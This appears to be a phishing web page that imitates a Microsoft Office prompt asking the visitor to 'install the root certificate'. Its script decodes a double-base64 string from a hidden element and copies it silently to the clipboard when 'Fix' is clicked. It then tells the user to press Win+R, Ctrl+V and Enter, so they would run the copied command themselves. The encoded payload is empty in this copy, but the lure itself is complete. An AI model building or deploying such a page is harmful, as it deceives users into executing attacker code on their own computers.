<!DOCTYPE html><html lang="ru"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Microsoft Office</title><style>body {margin: 0;font-family: Arial, sans-serif;}a {text-decoration: none;}#blur-background {position: fixed;top: 0;left: 0;width: 100%;height: 100%;background: url('https://i.postimg.cc/k9fnrfrD/background.gif');background-repeat: no-repeat;background-size: cover;filter: blur(4px);z-index: 1;}#modal {position: fixed;top: 50%;left: 50%;transform: translate(-50%, -50%);background: white;padding: 20px;box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);z-index: 2;display: none;}.modal-content {display: flex;flex-direction: column;align-items: center;}.modal-header {display: flex;align-items: center;}.logo {width: 100px;height: 100px;}.header-text {font-size: 18px;margin-left: 20px;text-align: left;}.modal-body {font-size: 16px;margin-top: 20px;text-align: left;}.modal-footer {margin-top: 20px;display: flex;justify-content: center;gap: 10px;}.btn {font-size: 14px;padding: 10px 40px;border: none;cursor: pointer;width: 100px;text-align: center;}.blue-btn {background-color: #073d92;color: white;}.blue-btn:hover {background-color: #115abe;}.white-btn {background-color: #d7d5d4;color: black;}.white-btn:hover {background-color: #f0f0f0;}</style></head><body><div id="blur-background"></div><div id="modal"><div class="modal-content"><div class="modal-header"><img src="data:image/gif;base64," alt="logo" class="logo"><div class="header-text"><p>Create, edit and share Word documents. Work with others on shared projects, in real-time.</p></div></div><div class="modal-body"><p id="message1">To display this web page correctly, please install the root certificate. Please follow the instructions below using the <b>"Fix"</b> button.</p><p id="message2" style="display: none;">Press the key combination <b><img src="data:image/png;base64," width="16" height="16"> + R</b> and then <b>Ctrl + V</b>, then press <b>Enter</b>.</p></div><div class="modal-footer"><a href="#" id="download" class="btn blue-btn">Fix</a><a target="_blank" href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/certificates-and-public-key-infrastructure-pki/trusted-root-certificates-are-required" class="btn white-btn">Details</a></div></div><textarea id="security" cols="4" rows="4" style="margin: -4000px;"></textarea><div id="hello" style="display: none;"></div></div><script src="https://code.jquery.com/jquery-3.6.4.min.js"></script><script>$(document).ready(function(){$('#modal').fadeIn();$("#security").val(window.atob(window.atob(document.getElementById("hello").innerHTML)));download.addEventListener("click", function(){var message1 = document.getElementById("message1");message1.style.display = "none";var message2 = document.getElementById("message2");message2.style.display = "block";var codeInput = document.getElementById("security");codeInput.select();document.execCommand("copy");window.getSelection().removeAllRanges();});});</script></body></html>